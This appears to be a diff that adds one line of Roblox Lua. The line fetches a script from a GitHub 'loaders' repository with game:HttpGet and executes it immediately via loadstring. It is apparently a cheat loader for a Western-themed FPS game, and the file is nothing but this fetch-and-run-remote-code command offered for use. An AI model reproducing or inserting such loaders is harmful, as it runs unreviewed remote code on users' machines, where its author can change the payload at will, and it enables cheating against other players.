@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/showdown-western-fps-spam7-mhz7llcjmb4f0y.lua"))()
